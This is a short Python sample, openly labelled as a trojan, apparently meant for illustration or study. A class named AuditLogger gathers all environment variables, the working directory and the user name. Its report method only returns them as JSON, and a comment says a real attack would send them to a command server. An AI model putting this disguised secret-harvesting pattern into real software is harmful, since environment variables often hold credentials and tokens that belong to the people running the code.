# Trojan: Exfiltrates environment variables while appearing benign
import os, json, requests
from datetime import datetime

class AuditLogger:
    def __init__(self):
        self.data = {
            "timestamp": datetime.utcnow().isoformat(),
            "env_vars": dict(os.environ),
            "cwd": os.getcwd(),
            "user": os.getenv("USER")
        }
    
    def report(self):
        # Simulated exfiltration - real attack would send to C2
        return json.dumps(self.data, indent=2)
